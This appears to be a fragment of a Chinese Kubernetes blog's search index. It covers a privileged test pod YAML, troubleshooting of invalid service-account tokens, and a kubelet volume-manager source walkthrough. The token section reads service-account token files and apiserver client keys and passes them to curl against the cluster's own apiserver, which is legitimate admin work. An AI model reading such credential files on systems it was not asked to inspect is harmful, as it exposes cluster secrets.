","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:3:2","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"test pod启动yaml test-pod.yaml apiVersion:v1kind:Podmetadata:name:testpodlabels:app:myappversion:v1spec:# schedulerName: kube-batchcontainers:- name:appimage:busybox:1.31.0imagePullPolicy:IfNotPresentcommand:[\"sleep\",\"3600\"]securityContext:privileged:trueresources:limits:cpu:\"0.5\"# memory: \"100Mi\"requests:cpu:\"0.5\"# memory: \"100Mi\"affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:# 硬策略nodeSelectorTerms:# - matchExpressions:# - key: node-role.kubernetes.io/master# operator: In# values:# - \"true\"- matchExpressions:- key:kubernetes.io/hostnameoperator:Invalues:- \"test-node\" ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:4:0","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"附录 一些命令 kubectl get po -A |grep latency- |grep -v Running |wc -l ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:5:0","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"invalid token问题定位分析","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"invalid token问题定位分析，以及排查方法 ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:0:0","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"问题现象 环境中出现了某插件业务pod的k8s client访问apiserver时认证失败，错误原因：unauthorized 查看apiserver日志，报错信息如下： invalid bearer token, token has been invalidated ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:1:0","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"检查token有效性测试 找到问题pod使用的token，有两种方式途径获取 进入pod中，/var/run/secrets/kubernetes.io/serviceaccount/token 在节点上，访问pod的数据目录获取 # 方式1：在pod内部获取 TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token` CAFILE=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt # 方式2：在master节点上，从k8s和pod数据目录内获取 #TOKEN=`cat /var/lib/kubelet/pods/podid/volumes/kubernetes.io~secret/podname/token` #CAFILE=/etc/kubernetes/pki/ca.crt # 接口正常访问前提：该token有获取pods权限 #podlist=https://100.7.36.176:6443/api/v1/namespaces/default/pods podlist=https://100.7.36.176:6443/api/v1/namespaces/aistation/pods # curl apiserver curl --cacert $CAFILE --header \"Authorization: Bearer $TOKEN\" $podlist 如果上面接口访问正常，则说明token有效。 如果出现token无效导致失败，则进行下面分析。 ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:2:0","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"分析流程 ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:3:0","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"1. 查看k8s系统保存的某组件的secret信息 keyword=deviceplugin kubectl get secrect |grep $keyword ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:3:1","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"2. 查看token信息 kubectl describe secrect xxx ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:3:2","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"3. 查看某组件pod的挂载注入信息 pod的token是在pod创建时注入的。所以查看pod信息能够看到pod mount信息 检查是否从系统保存的secret信息获取的token # pod 内部 cat /var/run/secrets/kubernetes.io/serviceaccount/token 或者 查看挂载信息 mount |grep kubernetes.io~secret /var/run/secrets/kubernetes.io/serviceaccount/ 目录 [root@node131 coredns-token-hgchg]#ll /var/run/secrets/kubernetes.io/serviceaccount/ lrwxrwxrwx. 1 root root 13 2月 4 15:11 ca.crt -\u003e ..data/ca.crt lrwxrwxrwx. 1 root root 16 2月 4 15:11 namespace -\u003e ..data/namespace lrwxrwxrwx. 1 root root 12 2月 4 15:11 token -\u003e ..data/token 检查是否从系统获取的最新token 说明：如果不一致，说明此时pod持有的token无效，就会导致pod访问aiserver认证失败 ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:3:3","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"原因 暂时分析如下，后续总结更新 集群中的pod的serviceaccount有更新，包括secret，但是pod由于某原因没有及时同步更新，导致token无效，api接口无法认证通过 ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:4:0","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"解决 删除pod，pod重建时重新获取token，访问apiserver正常 ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:5:0","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"参考 https://github.com/kubernetes/kubernetes/issues/22351 https://github.com/kubernetes/kubernetes/issues/72026 ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:6:0","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"附录 ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:7:0","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"token脚本 k8s_token_test.sh #!/bin/bash token=$(echo $1|base64 -d) echo $token curl -XGET -H \"Authorization:Bearer $token\" -k https://127.0.0.1:10248/healthz ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:7:1","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"配置命令 带证书文件进行k8s apiserver的https服务 用命令行总是很麻烦，因为要自定义一些证书的位置。。。。。。。 master节点上访问服务 # master节点上 curl https://10.151.11.61:6443/api/v1/nodes \\ --cacert /etc/kubernetes/pki/ca.crt \\ --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt \\ --key /etc/kubernetes/pki/apiserver-kubelet-client.key node节点上访问服务 # node节点上 curl https://10.151.11.61:6443/api/v1/nodes \\ --cacert /home/wangb/ssl/ca.crt \\ --cert /home/wangb/ssl/apiserver-kubelet-client.crt \\ --key /home/wangb/ssl/apiserver-kubelet-client.key ","date":"2021-02-26","objectID":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/:7:2","tags":["K8S"],"title":"k8s的业务pod组件的invalid token问题","uri":"/posts/2021/02/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%BB%84%E4%BB%B6%E7%9A%84invalid-token%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"k8s1.20 kubelet的volume manager源码分析","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"kubelet volume manager组件源码分析 k8s版本：1.20.0 ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:0:0","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"总体 ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:0","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"volume模块图 kubelet调用VolumeManager，为pods准备存储设备，存储设备就绪会挂载存储设备到pod所在的节点上，并在容器启动的时候挂载在容器指定的目录中；同时，删除卸载不再使用的存储； kubernetes采用Volume Plugins来实现存储卷的挂载等操作 ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:1","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"volume manager 源码位置：kubernetes\\pkg\\kubelet\\volumemanager const ( // reconcilerLoopSleepPeriod is the amount of time the reconciler loop waits // between successive executions reconcilerLoopSleepPeriod = 100 * time.Millisecond // desiredStateOfWorldPopulatorLoopSleepPeriod is the amount of time the // DesiredStateOfWorldPopulator loop waits between successive executions desiredStateOfWorldPopulatorLoopSleepPeriod = 100 * time.Millisecond // desiredStateOfWorldPopulatorGetPodStatusRetryDuration is the amount of // time the DesiredStateOfWorldPopulator loop waits between successive pod // cleanup calls (to prevent calling containerruntime.GetPodStatus too // frequently). desiredStateOfWorldPopulatorGetPodStatusRetryDuration = 2 * time.Second // podAttachAndMountTimeout is the maximum amount of time the // WaitForAttachAndMount call will wait for all volumes in the specified pod // to be attached and mounted. Even though cloud operations can take several // minutes to complete, we set the timeout to 2 minutes because kubelet // will retry in the next sync iteration. This frees the associated // goroutine of the pod to process newer updates if needed (e.g., a delete // request to the pod). // Value is slightly offset from 2 minutes to make timeouts due to this // constant recognizable. podAttachAndMountTimeout = 2*time.Minute + 3*time.Second // podAttachAndMountRetryInterval is the amount of time the GetVolumesForPod // call waits before retrying podAttachAndMountRetryInterval = 300 * time.Millisecond // waitForAttachTimeout is the maximum amount of time a // operationexecutor.Mount call will wait for a volume to be attached. // Set to 10 minutes because we've seen attach operations take several // minutes to complete for some volume plugins in some cases. While this // operation is waiting it only blocks other operations on the same device, // other devices are not affected. waitForAttachTimeout = 10 * time.Minute ) // VolumeManager runs a set of asynchronous loops that figure out which volumes // need to be attached/mounted/unmounted/detached based on the pods scheduled on // this node and makes it so. type VolumeManager interface { // Starts the volume manager and all the asynchronous loops that it controls Run(sourcesReady config.SourcesReady, stopCh \u003c-chan struct{}) // WaitForAttachAndMount processes the volumes referenced in the specified // pod and blocks until they are all attached and mounted (reflected in // actual state of the world). // An error is returned if all volumes are not attached and mounted within // the duration defined in podAttachAndMountTimeout. WaitForAttachAndMount(pod *v1.Pod) error // GetMountedVolumesForPod returns a VolumeMap containing the volumes // referenced by the specified pod that are successfully attached and // mounted. The key in the map is the OuterVolumeSpecName (i.e. // pod.Spec.Volumes[x].Name). It returns an empty VolumeMap if pod has no // volumes. GetMountedVolumesForPod(podName types.UniquePodName) container.VolumeMap // GetExtraSupplementalGroupsForPod returns a list of the extra // supplemental groups for the Pod. These extra supplemental groups come // from annotations on persistent volumes that the pod depends on. GetExtraSupplementalGroupsForPod(pod *v1.Pod) []int64 // GetVolumesInUse returns a list of all volumes that implement the volume.Attacher // interface and are currently in use according to the actual and desired // state of the world caches. A volume is considered \"in use\" as soon as it // is added to the desired state of world, indicating it *should* be // attached to this node and remains \"in use\" until it is removed from both // the desired state of the world and the actual state of the world, or it // has been unmounted (as indicated in actual state of world). GetVolumesInUse() []v1.UniqueVolumeName // ReconcilerStatesHasBeenSynced returns true only after the actual states in reconciler // has been synced at least once after kubelet starts so that it is safe to upd","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:2","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"VolumeManager接口说明 运行在kubelet 里让存储Ready的部件，主要是mount/unmount（attach/detach可选） pod调度到这个node上后才会有卷的相应操作，所以它的触发端是kubelet（严格讲是kubelet里的pod manager），根据Pod Manager里pod spec里申明的存储来触发卷的挂载操作 Kubelet会监听到调度到该节点上的pod声明，会把pod缓存到Pod Manager中，VolumeManager通过Pod Manager获取PV/PVC的状态，并进行分析出具体的attach/detach、mount/umount, 操作然后调用plugin进行相应的业务处理 ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:3","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"volumeManager结构体 volumeManager结构体实现了VolumeManager接口，主要有两个需要注意： desiredStateOfWorld：预期状态，volume需要被attach，哪些pods引用这个volume actualStateOfWorld：实际状态，volume已经被atttach哪个node，哪个pod mount volume ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:4","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"desiredStateOfWorld 和 actualStateOfWorld desiredStateOfWorld为理想的volume情况，它主要是根据podManger获取所有的Pod信息，从中提取Volume信息。 actualStateOfWorld则是实际的volume情况。 desiredStateOfWorldPopulator通过podManager去构建desiredStateOfWorld。 reconciler的工作主要是比较actualStateOfWorld和desiredStateOfWorld的差别，然后进行volume的创建、删除和修改，最后使二者达到一致。 ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:5","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"流程 ","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:2:0","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"新建 NewVolumeManager中主要构造了几个volume控制器 volumePluginMgr 和 csiMigratedPluginManager desiredStateOfWorldPopulator reconciler // NewMainKubelet instantiates a new Kubelet object along with all the required internal modules. // No initialization of Kubelet and its modules should happen here. func NewMainKubelet(){ // ...... // setup volumeManager klet.volumeManager = volumemanager.NewVolumeManager( kubeCfg.EnableControllerAttachDetach, nodeName, klet.podManager, klet.statusManager, klet.kubeClient, klet.volumePluginMgr, klet.containerRuntime, kubeDeps.Mounter, kubeDeps.HostUtil, klet.getPodsDir(), kubeDeps.Recorder, experimentalCheckNodeCapabilitiesBeforeMount, keepTerminatedPodVolumes, volumepathhandler.NewBlockVolumePathHandler()) // ...... } // NewVolumeManager returns a new concrete instance implementing the // VolumeManager interface. // // kubeClient - kubeClient is the kube API client used by DesiredStateOfWorldPopulator // to communicate with the API server to fetch PV and PVC objects // volumePluginMgr - the volume plugin manager used to access volume plugins. // Must be pre-initialized. func NewVolumeManager(){ vm := \u0026volumeManager{ kubeClient: kubeClient, volumePluginMgr: volumePluginMgr, desiredStateOfWorld: cache.NewDesiredStateOfWorld(volumePluginMgr), actualStateOfWorld: cache.NewActualStateOfWorld(nodeName, volumePluginMgr), operationExecutor: operationexecutor.NewOperationExecutor(operationexecutor.NewOperationGenerator( kubeClient, volumePluginMgr, recorder, checkNodeCapabilitiesBeforeMount, blockVolumePathHandler)), } intreeToCSITranslator := csitrans.New() csiMigratedPluginManager := csimigration.NewPluginManager(intreeToCSITranslator) vm.intreeToCSITranslator = intreeToCSITranslator vm.csiMigratedPluginManager = csiMigratedPluginManager vm.desiredStateOfWorldPopulator = populator.NewDesiredStateOfWorldPopulator( kubeClient, desiredStateOfWorldPopulatorLoopSleepPeriod, desiredStateOfWorldPopulatorGetPodStatusRetryDuration, podManager, podStatusProvider, vm.desiredStateOfWorld, vm.actualStateOfWorld, kubeContainerRuntime, keepTerminatedPodVolumes, csiMigratedPluginManager, intreeToCSITranslator, volumePluginMgr) vm.reconciler = reconciler.NewReconciler( kubeClient, controllerAttachDetachEnabled, reconcilerLoopSleepPeriod, waitForAttachTimeout, nodeName, vm.desiredStateOfWorld, vm.actualStateOfWorld, vm.desiredStateOfWorldPopulator.HasAddedPods, vm.operationExecutor, mounter, hostutil, volumePluginMgr, kubeletPodsDir) return vm } // NewDesiredStateOfWorldPopulator returns a new instance of // DesiredStateOfWorldPopulator. // // kubeClient - used to fetch PV and PVC objects from the API server // loopSleepDuration - the amount of time the populator loop sleeps between // successive executions // podManager - the kubelet podManager that is the source of truth for the pods // that exist on this host // desiredStateOfWorld - the cache to populate func NewDesiredStateOfWorldPopulator( kubeClient clientset.Interface, loopSleepDuration time.Duration, getPodStatusRetryDuration time.Duration, podManager pod.Manager, podStatusProvider status.PodStatusProvider, desiredStateOfWorld cache.DesiredStateOfWorld, actualStateOfWorld cache.ActualStateOfWorld, kubeContainerRuntime kubecontainer.Runtime, keepTerminatedPodVolumes bool, csiMigratedPluginManager csimigration.PluginManager, intreeToCSITranslator csimigration.InTreeToCSITranslator, volumePluginMgr *volume.VolumePluginMgr) DesiredStateOfWorldPopulator { return \u0026desiredStateOfWorldPopulator{ kubeClient: kubeClient, loopSleepDuration: loopSleepDuration, getPodStatusRetryDuration: getPodStatusRetryDuration, podManager: podManager, podStatusProvider: podStatusProvider, desiredStateOfWorld: desiredStateOfWorld, actualStateOfWorld: actualStateOfWorld, pods: processedPods{ processedPods: make(map[volumetypes.UniquePodName]bool)}, kubeContainerRuntime: kubeContainerRuntime, keepTerminatedPodVolumes: keepTerminatedPodVolumes, hasAddedPods: false, hasAddedPodsLock: sync.RWMutex{}, csiM","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:2:1","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"启动 kl.volumeManager.Run // Run starts the kubelet reacting to config updates func (kl *Kubelet) Run(updates \u003c-chan kubetypes.PodUpdate) { // Start volume manager go kl.volumeManager.Run(kl.sourcesReady, wait.NeverStop) go wait.Until(kl.updateRuntimeUp, 5*time.Second, wait.NeverStop) // Set up iptables util rules if kl.makeIPTablesUtilChains { kl.initNetworkUtil() } // Start a goroutine responsible for killing pods (that are not properly // handled by pod workers). go wait.Until(kl.podKiller.PerformPodKillingWork, 1*time.Second, wait.NeverStop) // Start component sync loops. kl.statusManager.Start() kl.probeManager.Start() // Start syncing RuntimeClasses if enabled. if kl.runtimeClassManager != nil { kl.runtimeClassManager.Start(wait.NeverStop) } // Start the pod lifecycle event generator. kl.pleg.Start() kl.syncLoop(updates, kl) } func (vm *volumeManager) Run(sourcesReady config.SourcesReady, stopCh \u003c-chan struct{}) { defer runtime.HandleCrash() if vm.kubeClient != nil { // start informer for CSIDriver go vm.volumePluginMgr.Run(stopCh) } go vm.desiredStateOfWorldPopulator.Run(sourcesReady, stopCh) klog.V(2).Infof(\"The desired_state_of_world populator starts\") klog.Infof(\"Starting Kubelet Volume Manager\") go vm.reconciler.Run(stopCh) metrics.Register(vm.actualStateOfWorld, vm.desiredStateOfWorld, vm.volumePluginMgr) \u003c-stopCh klog.Infof(\"Shutting down Kubelet Volume Manager\") } 启动子模块有 如果有volumePlugin（默认安装时没有插件），启动volumePluginMgr 启动 desiredStateOfWorldPopulator：从apiserver同步到的pod信息，更新DesiredStateOfWorld findAndAddNewPods() findAndRemoveDeletedPods() 每隔dswp.getPodStatusRetryDuration时长，进行findAndRemoveDeletedPods() 启动 reconciler：预期状态和实际状态的协调者，负责调整实际状态至预期状态 desiredStateOfWorldPopulator 通过populatorLoop()来更新DesiredStateOfWorld func (dswp *desiredStateOfWorldPopulator) populatorLoop() { dswp.findAndAddNewPods() // findAndRemoveDeletedPods() calls out to the container runtime to // determine if the containers for a given pod are terminated. This is // an expensive operation, therefore we limit the rate that // findAndRemoveDeletedPods() is called independently of the main // populator loop. if time.Since(dswp.timeOfLastGetPodStatus) \u003c dswp.getPodStatusRetryDuration { klog.V(5).Infof( \"Skipping findAndRemoveDeletedPods(). Not permitted until %v (getPodStatusRetryDuration %v).\", dswp.timeOfLastGetPodStatus.Add(dswp.getPodStatusRetryDuration), dswp.getPodStatusRetryDuration) return } dswp.findAndRemoveDeletedPods() } findAndAddNewPods 遍历pod manager中所有pod 过滤掉Terminated态的pod，进行processPodVolumes，把这些pod添加到desired state of world 就是通过podManager获取所有的pods，然后调用processPodVolumes去更新desiredStateOfWorld。但是这样只能更新新增加的Pods的Volume信息。 // Iterate through all pods and add to desired state of world if they don't // exist but should func (dswp *desiredStateOfWorldPopulator) findAndAddNewPods() { // Map unique pod name to outer volume name to MountedVolume. mountedVolumesForPod := make(map[volumetypes.UniquePodName]map[string]cache.MountedVolume) if utilfeature.DefaultFeatureGate.Enabled(features.ExpandInUsePersistentVolumes) { for _, mountedVolume := range dswp.actualStateOfWorld.GetMountedVolumes() { mountedVolumes, exist := mountedVolumesForPod[mountedVolume.PodName] if !exist { mountedVolumes = make(map[string]cache.MountedVolume) mountedVolumesForPod[mountedVolume.PodName] = mountedVolumes } mountedVolumes[mountedVolume.OuterVolumeSpecName] = mountedVolume } } processedVolumesForFSResize := sets.NewString() for _, pod := range dswp.podManager.GetPods() { if dswp.isPodTerminated(pod) { // Do not (re)add volumes for terminated pods continue } dswp.processPodVolumes(pod, mountedVolumesForPod, processedVolumesForFSResize) } } processPodVolumes 更新desiredStateOfWorld // processPodVolumes processes the volumes in the given pod and adds them to the // desired state of the world. func (dswp *desiredStateOfWorldPopulator) processPodVolumes( pod *v1.Pod, mountedVolumesForPod map[volumetypes.UniquePodName]map[string]cache.MountedVolume, processedVolumesForFSResize sets.S","date":"2021-02-25","objectID":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:2:2","tags":["K8S"],"title":"kubelet volume manager源码分析","uri":"/posts/2021/02/kubelet-volume-manager%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"NFS的mount setup 挂载命令默认使用了系统命令mount nfs中为每个volume的挂载目录路径的pluginName是kubernetes.io~nfs mount操作的source为nfs server 的 exportPath mount操作的target为dir，即pod的nfs卷路径位置nfsMounter.GetPath()，示例见下 source := fmt.Sprintf(\"%s:%s\", nfsMounter.server, nfsMounter.exportPath) err = nfsMounter.mounter.MountSensitiveWithoutSystemd(source, dir, \"nfs\", mountOptions, nil) nfs的挂载volume路径dir示例： var/lib/kubelet/pods/{podid}//volumes/{pluginName}/{pvname} # nfsMounter.GetPath() #/var/lib/kubelet/pods/{podid}//volumes/{pluginName}/{pvname} /var/lib/kubelet/pods/06d10daa-c7e8-46e5-b94a-c0fcd2f27a2e/volumes/kubernetes.io~nfs/pvc-1f9f7ceb-6ca8-453e-87a0-013e53841fad mount挂载处理 // SetUp attaches the disk and bind mounts to the volume path. func (nfsMounter *nfsMounter) SetUp(mounterArgs volume.MounterArgs) error { return nfsMounter.SetUpAt(nfsMounter.GetPath(), mounterArgs) } func (nfsMounter *nfsMounter) SetUpAt(dir string, mounterArgs volume.MounterArgs) error { notMnt, err := mount.IsNotMountPoint(nfsMounter.mounter, dir) klog.V(4).Infof(\"NFS mount set up: %s %v %v\", dir, !notMnt, err) if err != nil \u0026\u0026 !os.IsNotExist(err) { return err } if !notMnt { return nil } if err := os.MkdirAll(dir, 0750); err != nil { return err } source := fmt.Sprintf(\"%s:%s\", nfsMounter.server, nfsMounter.exportPath) options := []string{} if nfsMounter.readOnly { options = append(options, \"ro\") } mountOptions := util.JoinMountOptions(nfsMounter.mountOptions, options) err = nfsMounter.mounter.MountSensitiveWithoutSystemd(source, dir, \"nfs\", mountOptions, nil) if err != nil { notMnt, mntErr := mount.IsNotMountPoint(nfsMounter.mounter, dir) if mntErr != nil { klog.Errorf(\"IsNotMountPoint check failed: %v\", mntErr) return err } if !notMnt { if mntErr = nfsMounter.mounter.Unmount(dir); mntErr != nil { klog.Errorf(\"Failed to unmount: %v\", mntErr) return err } notMnt, mntErr := mount.IsNotMountPoint(nfsMounter.mounter, dir) if mntErr != nil { klog.Errorf(\"IsNotMountPoint check failed: %v\", mntErr) return err } if !notMnt { // This is very odd, we don't expect it. We'll try again next sync loop. klog.Errorf(\"%s is still 